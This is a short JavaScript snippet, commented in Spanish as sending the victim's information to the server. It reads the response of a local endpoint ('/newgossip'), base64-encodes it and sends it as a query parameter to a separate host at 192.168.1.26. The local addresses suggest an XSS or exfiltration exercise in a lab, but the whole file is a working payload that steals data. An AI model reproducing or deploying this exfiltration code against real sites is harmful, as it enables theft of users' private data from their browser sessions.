// este script se encarga de enviar la informacion de la victima al servidor
dominio = "http://localhost:10007/newgossip";
dominioServidor="http://192.168.1.26:80";

request1 = new XMLHttpRequest();

request1.open("GET", dominio, false);
request1.send();

response= request1.responseText;
console.log(response);

request2 = new XMLHttpRequest();
request2.open("GET", dominioServidor + "/?data=" + btoa(response));
request2.send();
